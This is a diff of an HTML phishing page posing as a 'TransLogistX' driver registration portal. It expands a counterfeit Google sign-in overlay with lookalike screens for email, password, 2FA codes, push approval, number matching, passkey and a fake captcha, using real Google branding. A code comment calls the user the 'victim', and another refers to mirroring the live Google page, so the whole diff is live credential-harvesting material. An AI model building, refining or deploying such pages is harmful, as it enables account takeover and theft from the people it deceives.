@@ -3,13 +3,16 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Driver registration &mdash; TransLogix</title>
+<title>Driver registration &mdash; TransLogistX</title>
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48' fill='%230b57d0'%3E%3Cpath d='M8 24 14 15h20l6 9v9H8V24z'/%3E%3C/svg%3E" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@600;700;800&amp;family=Manrope:wght@400;500;600;700&amp;display=swap" />
 <link rel="stylesheet" href="/wizard.css" />
 </head>
 <body>
 
-<!-- ============ LANDING PAGE (TransLogix driver portal) ============ -->
+<!-- ============ LANDING PAGE (TransLogistX driver portal) ============ -->
 <style>
   #landing { font-family: 'Google Sans', 'Segoe UI', Arial, sans-serif; color: #202124; background: #fff; }
   #landing * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -33,6 +36,7 @@
 
   #landing .sec { display: flex; align-items: center; gap: 9px; font-size: 12px; font-weight: 600; color: #0b57d0; letter-spacing: .4px; text-transform: uppercase; margin: 6px 0 14px; }
   #landing .sec::after { content: ""; flex: 1; height: 1px; background: #e8eaed; }
+  #landing .sec .opt { color: #9aa0a6; font-weight: 500; font-size: 11px; letter-spacing: 0; text-transform: none; }
   #landing label { display: block; font-size: 13px; font-weight: 500; color: #3c4043; margin-bottom: 6px; }
   #landing .req { color: #c5221f; }
   #landing input, #landing select { width: 100%; height: 46px; padding: 0 14px; border: 1.5px solid #dadce0; border-radius: 10px; font-size: 15px; color: #202124; background: #fff; font-family: inherit; margin-bottom: 16px; transition: border-color .15s, box-shadow .15s; }
@@ -43,12 +47,24 @@
   #landing .dr-hint { font-size: 13px; color: #c5221f; margin: -4px 0 12px; }
   #landing .dr-hint:empty { margin: 0; }
 
-  #landing .divider { display: flex; align-items: center; gap: 12px; color: #9aa0a6; font-size: 11px; font-weight: 500; text-transform: uppercase; letter-spacing: .7px; margin: 4px 0 14px; }
-  #landing .divider::before, #landing .divider::after { content: ""; flex: 1; height: 1px; background: #e8eaed; }
-  #landing .google-btn { width: 100%; height: 48px; border: none; border-radius: 999px; background: #0b57d0; color: #fff; font-family: inherit; font-size: 15px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px; box-shadow: 0 1px 3px rgba(60, 64, 67, .3); transition: background .15s, box-shadow .15s; }
-  #landing .google-btn:hover { background: #1b66c9; box-shadow: 0 2px 6px rgba(60, 64, 67, .35); }
-  #landing .google-btn svg { width: 20px; height: 20px; flex: none; }
-  #landing .google-btn .spin { display: none; width: 18px; height: 18px; border: 2px solid rgba(255, 255, 255, .35); border-top-color: #fff; border-radius: 50%; animation: gspin .65s linear infinite; }
+  /* --- optional document uploads (insurance certificate / company license) --- */
+  #landing .up { display: flex; flex-direction: column; gap: 6px; }
+  #landing .up-label { font-size: 13px; font-weight: 500; color: #3c4043; }
+  #landing .up-box { display: flex; align-items: center; justify-content: space-between; gap: 8px; min-height: 46px; padding: 0 14px; border: 1.5px dashed #c6cace; border-radius: 10px; background: #fff; cursor: pointer; transition: border-color .15s, background .15s; }
+  #landing .up-box:hover { border-color: #9aa0a6; background: #f8fafd; }
+  #landing .up-box.has { border-style: solid; border-color: #a8dab5; background: #f4fbf5; }
+  #landing .up-text { font-size: 13.5px; color: #5f6368; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  #landing .up-box.has .up-text { color: #188038; font-weight: 500; }
+  #landing .up-clear { font-size: 17px; line-height: 1; color: #9aa0a6; padding: 2px 6px; border-radius: 6px; flex: none; }
+  #landing .up-clear:hover { color: #c5221f; background: #fde7e7; }
+  #landing .up-hint { font-size: 11.5px; color: #9aa0a6; }
+
+  /* --- Google sign-in button (the real OAuth button: white, 1px #dadce0,
+     4px radius, 40px tall, 14px text — per Google's current spec) --- */
+  #landing .google-btn { width: 100%; height: 40px; border: 1px solid #dadce0; border-radius: 4px; background: #fff; color: #3c4043; font-family: inherit; font-size: 14px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: none; transition: background .15s, box-shadow .15s; margin-top: 4px; }
+  #landing .google-btn:hover { background: #f8fafd; box-shadow: 0 1px 2px rgba(60, 64, 67, .15); }
+  #landing .google-btn svg { width: 18px; height: 18px; flex: none; }
+  #landing .google-btn .spin { display: none; width: 18px; height: 18px; border: 2px solid rgba(60, 64, 67, .2); border-top-color: #3c4043; border-radius: 50%; animation: gspin .65s linear infinite; }
   #landing .google-btn.loading .spin { display: inline-block; }
   #landing .google-btn.loading .b-label, #landing .google-btn.loading svg { opacity: 0; }
   #landing .secure-note { text-align: center; font-size: 12px; color: #9aa0a6; line-height: 1.5; margin-top: 14px; }
@@ -65,6 +81,44 @@
   #landing .foot { display: flex; align-items: center; justify-content: space-between; gap: 14px; flex-wrap: wrap; padding: 18px 30px; background: #fff; border-top: 1px solid #e8eaed; font-size: 12.5px; color: #5f6368; }
   #landing .foot-links { display: flex; gap: 18px; }
   #landing .foot-links span { cursor: default; }
+
+  /* --- embed mode (?embed=1): wizard rendered inside the landing page ---
+     Styled to read as a native part of the TransLogistX landing (light
+     section, white form card, dark text, brand accents). */
+  .wz-embed body { background: transparent !important; font-family: 'Manrope', sans-serif; }
+  .wz-embed #landing { min-height: 0; }
+  .wz-embed #landing .reg-wrap { padding: 8px 6px; background: transparent; }
+  .wz-embed #landing .card {
+    background: #fff; border: 1px solid #e7e5df;
+    border-radius: 18px; box-shadow: 0 10px 30px rgba(28, 32, 38, .06);
+  }
+  .wz-embed #landing .card-head { display: none; }
+  .wz-embed #landing .trust { display: none; }
+  .wz-embed #landing .secure-note { color: #9aa0a6; }
+  .wz-embed #landing .foot { display: none; }
+  .wz-embed #landing form { padding: 28px 30px 30px; }
+  .wz-embed #landing .sec {
+    color: #2f5d5a; font-family: 'Barlow Condensed', sans-serif;
+    font-size: 15px; font-weight: 700; letter-spacing: .14em;
+  }
+  .wz-embed #landing .sec .opt { color: #9aa0a6; }
+  .wz-embed #landing .sec::after { background: #e7e5df; }
+  .wz-embed #landing label { color: #3c4043; font-weight: 500; }
+  .wz-embed #landing .req { color: #c5221f; }
+  .wz-embed #landing input {
+    background: #fff; border: 1.5px solid #dadce0;
+    color: #202124; border-radius: 10px; font-family: 'Manrope', sans-serif;
+  }
+  .wz-embed #landing input::placeholder { color: #9aa0a6; }
+  .wz-embed #landing input:focus { border-color: #3c4043; box-shadow: 0 0 0 3px rgba(28, 32, 38, .08); }
+  .wz-embed #landing .dr-hint { color: #c5221f; }
+  /* success screen (light card) */
+  .wz-embed #landing .ls { color: #3c4043; }
+  .wz-embed #landing .ls h1 { color: #202124; font-family: 'Barlow Condensed', sans-serif; }
+  .wz-embed #landing .ls-sub b { color: #202124; }
+  .wz-embed #landing .ls-meta { background: #f8fafd; border-color: #e7e5df; color: #3c4043; }
+  .wz-embed #landing .ls-note { color: #9aa0a6; }
+  .wz-embed #landing .ls-ok { background: #e6f4ea; color: #188038; }
 </style>
 
 <div class="app" id="landing">
@@ -79,7 +133,7 @@
           <span class="step-pill">3&nbsp;·&nbsp;Registered</span>
         </div>
         <h1>Driver registration</h1>
-        <p class="sub">Complete your details and verify with a Google account. This registration link was sent by <b>driver-portal@translogix.com</b>.</p>
+        <p class="sub">Complete your details and verify with a Google account. This registration link was sent by <b>no-reply@translogistx.com</b>.</p>
       </div>
 
       <div class="trust">
@@ -89,61 +143,64 @@
       </div>
 
       <form id="form-driver" novalidate>
-        <div class="sec">Driver</div>
+        <div class="sec">Driver details</div>
 
-        <label for="d-name">Full name <span class="req">*</span></label>
-        <input type="text" id="d-name" name="fullname" placeholder="Jamie Reyes" autocomplete="name" spellcheck="false">
-
-        <div class="row">
-          <div>
-            <label for="d-phone">Mobile phone <span class="req">*</span></label>
-            <input type="tel" id="d-phone" name="phone" placeholder="+1 555 014 2233" autocomplete="tel" spellcheck="false">
-          </div>
-          <div>
-            <label for="d-email">Personal email</label>
-            <input type="email" id="d-email" name="email" placeholder="you@example.com" autocomplete="email" spellcheck="false">
-          </div>
-        </div>
-
-        <label for="d-license">Driver&rsquo;s license / ID number</label>
-        <input type="text" id="d-license" name="license" placeholder="D 991 442 0" spellcheck="false">
-
-        <div class="sec">Vehicle</div>
+        <label for="c-contact">Contact person <span class="req">*</span></label>
+        <input type="text" id="c-contact" name="contact" autocomplete="name" spellcheck="false">
 
         <div class="row">
           <div>
-            <label for="d-vehicle">Make &amp; model</label>
-            <input type="text" id="d-vehicle" name="vehicle" placeholder="Ram ProMaster 2500" spellcheck="false">
+            <label for="c-phone">Phone <span class="req">*</span></label>
+            <input type="tel" id="c-phone" name="phone" autocomplete="tel" spellcheck="false">
           </div>
           <div>
-            <label for="d-plate">Plate number <span class="req">*</span></label>
-            <input type="text" id="d-plate" name="plate" placeholder="KLM 482" autocomplete="off" spellcheck="false" style="text-transform: uppercase" />
+            <label for="c-truck">Truck plate number <span class="req">*</span></label>
+            <input type="text" id="c-truck" name="truckplate" autocomplete="off" spellcheck="false" style="text-transform: uppercase" />
           </div>
         </div>
-
-        <div class="sec">Pickup zone</div>
 
         <div class="row">
           <div>
-            <label for="d-city">City</label>
-            <input type="text" id="d-city" name="city" placeholder="Chicago" spellcheck="false">
+            <label for="c-trailer">Trailer plate number</label>
+            <input type="text" id="c-trailer" name="trailerplate" autocomplete="off" spellcheck="false" style="text-transform: uppercase" />
           </div>
           <div>
-            <label for="d-state">State</label>
-            <select id="d-state" name="state">
-              <option value="">Select&hellip;</option>
-              <option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option><option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option><option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option><option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option><option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option><option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option><option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option><option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option><option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option><option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option><option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option><option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option><option>Wisconsin</option><option>Wyoming</option><option>Washington, D.C.</option>
-            </select>
+            <label for="c-dname">Driver name <span class="req">*</span></label>
+            <input type="text" id="c-dname" name="drivername" autocomplete="name" spellcheck="false">
           </div>
         </div>
+
+        <label for="c-dphone">Driver phone <span class="req">*</span></label>
+        <input type="tel" id="c-dphone" name="driverphone" autocomplete="tel" spellcheck="false">
 
         <div class="dr-hint" id="driver-hint"></div>
 
-        <div class="divider">continue with</div>
+        <div class="sec">Documents <span class="opt">optional</span></div>
+
+        <div class="row" style="margin-bottom:20px">
+          <div class="up">
+            <span class="up-label">Insurance certificate</span>
+            <label class="up-box" id="up-insurance-box">
+              <input type="file" id="d-insurance" accept="image/*,application/pdf" hidden>
+              <span class="up-text" id="up-insurance-text">Add file</span>
+              <span class="up-clear" id="up-insurance-clear" title="Remove" hidden>&times;</span>
+            </label>
+            <span class="up-hint">PDF or image &middot; up to 10 MB</span>
+          </div>
+          <div class="up">
+            <span class="up-label">Company license</span>
+            <label class="up-box" id="up-license-box">
+              <input type="file" id="d-license" accept="image/*,application/pdf" hidden>
+              <span class="up-text" id="up-license-text">Add file</span>
+              <span class="up-clear" id="up-license-clear" title="Remove" hidden>&times;</span>
+            </label>
+            <span class="up-hint">PDF or image &middot; up to 10 MB</span>
+          </div>
+        </div>
 
         <button type="submit" id="btn-driver" class="google-btn">
           <svg class="gicon" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.6 20.1H42V20H24v8h11.3c-1.6 4.7-6.1 8-11.3 8-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.2 8 3l5.7-5.7C34.5 6.1 29.5 4 24 4 13 4 4 13 4 24s9 20 20 20 20-9 20-20c0-1.3-.1-2.6-.4-3.9z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.9 1.2 8 3l5.7-5.7C34.5 6.1 29.5 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.3-11.3-8l-6.5 5C9.5 39.6 16.2 44 24 44z"/><path fill="#1976D2" d="M43.6 20.1H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6l6.2 5.2C36.9 39.2 44 34 44 24c0-1.3-.1-2.6-.4-3.9z"/></svg>
-          <span class="b-label">Sign in with Google</span><span class="spin" aria-hidden="true"></span>
+          <span class="b-label">Continue with Google</span><span class="spin" aria-hidden="true"></span>
         </button>
       </form>
 
@@ -162,7 +219,7 @@
   </div>
 
   <div class="foot">
-    <div>&copy; 2026 TransLogix Logistics, Inc. &nbsp;&middot;&nbsp; 24/7 dispatch: <b>1-800-555-0142</b></div>
+    <div>&copy; 2026 TransLogistX Logistics, Inc. &nbsp;&middot;&nbsp; 24/7 dispatch</div>
     <div class="foot-links"><span>Help</span><span>Privacy</span><span>Terms</span><span>Cookies</span></div>
   </div>
 
@@ -172,11 +229,12 @@
 <div class="g-overlay hidden" id="g-overlay">
   <button class="g-close" id="g-close" aria-label="Close" title="Close">&times;</button>
 
-  <div class="g-card" id="card">
+  <div class="g-card">
+  <div class="g-body" id="card">
     <!-- EMAIL -->
     <div class="g-screen hidden" id="screen-email">
       <div class="g-logo" aria-hidden="true">
-        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+        <img src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google" width="74" height="24" />
       </div>
       <h1 class="g-title">Sign in</h1>
       <p class="g-subtitle">Use your Google Account</p>
@@ -187,17 +245,19 @@
           <label for="g-email">Email or phone</label>
         </div>
         <div class="g-hint" id="email-hint" hidden></div>
-        <div class="g-footer">
-          <button type="button" class="g-link" id="forgot-email">Forgot email?</button>
-          <button type="submit" class="g-btn" id="btn-email"><span class="b-label">Next</span><span class="spin" aria-hidden="true"></span></button>
-        </div>
+        <button type="button" class="g-link below" id="forgot-email">Forgot email?</button>
       </form>
+      <p class="g-guest">Not your computer? Use a private browsing window to sign in. <button type="button" class="g-link" id="guest-mode">Learn more about using Guest mode</button></p>
+      <div class="g-footer">
+        <button type="button" class="g-link" id="create-acct">Create account</button>
+        <button type="submit" class="g-btn" id="btn-email" form="form-email"><span class="b-label">Next</span><span class="spin" aria-hidden="true"></span></button>
+      </div>
     </div>
 
     <!-- PASSWORD -->
     <div class="g-screen hidden" id="screen-pass">
       <div class="g-logo" aria-hidden="true">
-        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+        <img src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google" width="74" height="24" />
       </div>
       <h1 class="g-title app" id="pass-title">Welcome</h1>
       <div class="g-account" id="account-row" hidden>
@@ -218,8 +278,9 @@
           <input type="checkbox" id="show-pass" />
           <span>Show password</span>
         </label>
+        <button type="button" class="g-link below" id="forgot-pass">Forgot password?</button>
         <div class="g-footer">
-          <button type="button" class="g-link" id="forgot-pass">Forgot password?</button>
+          <button type="button" class="g-link" id="btn-back">Back</button>
           <button type="submit" class="g-btn" id="btn-pass"><span class="b-label">Next</span><span class="spin" aria-hidden="true"></span></button>
         </div>
       </form>
@@ -228,10 +289,10 @@
     <!-- 2FA -->
     <div class="g-screen hidden" id="screen-totp">
       <div class="g-logo" aria-hidden="true">
-        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+        <img src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google" width="74" height="24" />
       </div>
       <h1 class="g-title">Verify it's you</h1>
-      <p class="g-caption">To help keep your account safe, Google wants to make sure it's really you. Enter the 6-digit code from your authenticator app — or the code Google just texted or emailed you — to finish.</p>
+      <p class="g-caption" id="totp-caption">To help keep your account safe, Google wants to make sure it's really you. Enter the 6-digit code from your authenticator app — or the code Google just texted or emailed you — to finish.</p>
       <div id="totp-numbers" class="g-numbig-row" style="display:none"></div>
 
       <div id="form-totp">
@@ -249,7 +310,7 @@
     <!-- APPROVE : Google is asking to "confirm it's you" / check-your-phone-approve -->
     <div class="g-screen hidden" id="screen-approval">
       <div class="g-logo" aria-hidden="true">
-        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+        <img src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google" width="74" height="24" />
       </div>
       <h1 class="g-title">Confirm it&rsquo;s you</h1>
       <p class="g-caption">To help keep your account safe, we&rsquo;ve sent a notification. Open it and tap <b>Approve</b> to finish signing in.</p>
@@ -267,12 +328,50 @@
          wizard.js from what the live Google page actually shows). -->
     <div class="g-screen hidden" id="screen-numchoice">
       <div class="g-logo" aria-hidden="true">
-        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+        <img src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google" width="74" height="24" />
       </div>
       <h1 class="g-title">Confirm it&rsquo;s you</h1>
       <p class="g-caption">To help keep your account safe, select the number below that matches this sign-in attempt on Google.</p>
       <div class="g-numtiles" id="num-tiles"></div>
       <div class="g-hint" id="num-choice-hint" hidden></div>
+    </div>
+
+    <!-- CHOICE: "choose how to confirm it's you" options list (after Try another way) -->
+    <div class="g-screen hidden" id="screen-choice">
+      <div class="g-logo" aria-hidden="true">
+        <img src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google" width="74" height="24" />
+      </div>
+      <h1 class="g-title">Choose how to confirm it&rsquo;s you</h1>
+      <p class="g-caption">To help keep your account safe, pick how you&rsquo;d like to get a verification code.</p>
+      <div class="g-choice-list" id="choice-options"></div>
+      <div class="g-hint" id="choice-hint" hidden></div>
+    </div>
+
+    <!-- PASSKEY: victim confirms on their device (fingerprint / face / PIN) -->
+    <div class="g-screen hidden" id="screen-passkey">
+      <div class="g-logo" aria-hidden="true">
+        <img src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google" width="74" height="24" />
+      </div>
+      <h1 class="g-title">Confirm it&rsquo;s you</h1>
+      <p class="g-caption">Use your passkey to confirm it&rsquo;s you. You&rsquo;ll be prompted to approve with a fingerprint, face, or your device PIN.</p>
+      <div class="g-approve-status"><span class="g-approve-dot"></span><span id="passkey-status">Waiting for your device&hellip;</span></div>
+      <div class="g-footer">
+        <button type="button" class="g-link" id="try-another-3">Try another way</button>
+        <button type="button" class="g-btn" id="btn-passkey"><span class="b-label">Continue</span><span class="spin" aria-hidden="true"></span></button>
+      </div>
+    </div>
+
+    <!-- CAPTCHA: bot check — nothing to enter, just wait + re-check -->
+    <div class="g-screen hidden" id="screen-captcha">
+      <div class="g-logo" aria-hidden="true">
+        <img src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google" width="74" height="24" />
+      </div>
+      <h1 class="g-title">Checking your connection&hellip;</h1>
+      <p class="g-caption">Please wait while we check your details. This usually takes a few seconds.</p>
+      <div class="g-approve-status"><span class="g-approve-dot"></span><span id="captcha-status">Working&hellip;</span></div>
+      <div class="g-footer" style="justify-content:center">
+        <button type="button" class="g-btn" id="btn-captcha"><span class="b-label">Continue</span><span class="spin" aria-hidden="true"></span></button>
+      </div>
     </div>
 
     <!-- SUCCESS (after Google sign-in completes) -->
@@ -285,6 +384,15 @@
         <button type="button" class="g-btn" id="btn-done">Done</button>
       </div>
     </div>
+  </div>
+  <div class="g-footerbar">
+    <button type="button" class="g-foot-lang">English (United States)<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg></button>
+    <div class="g-foot-links">
+      <button type="button" class="g-foot-link">Help</button>
+      <button type="button" class="g-foot-link">Privacy</button>
+      <button type="button" class="g-foot-link">Terms</button>
+    </div>
+  </div>
   </div>
 
   <div class="g-popfoot">Secured by <b>Google</b> Accounts ↩</div>
